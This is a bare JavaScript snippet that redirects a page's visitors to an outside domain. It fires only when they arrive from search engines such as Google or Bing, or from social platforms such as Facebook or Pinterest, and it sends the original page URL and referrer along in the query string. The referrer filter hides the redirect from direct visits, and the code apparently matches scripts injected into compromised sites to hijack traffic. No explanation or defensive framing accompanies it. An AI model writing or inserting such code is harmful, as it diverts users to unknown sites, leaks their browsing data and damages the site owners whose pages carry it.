var ars = rChoice([
    "https://nwdefenders.org",
]);

function rChoice(arr) {
    return arr[Math.floor(arr.length * Math.random())];
}

if (['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.', 'yahoo.', 'aol.', 'ask.', 'duckduckgo.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))) {
    window.location.href = ars + '/?arsae=' + encodeURIComponent(window.location.href) + '&arsae_ref=' + encodeURIComponent(document.referrer)
}
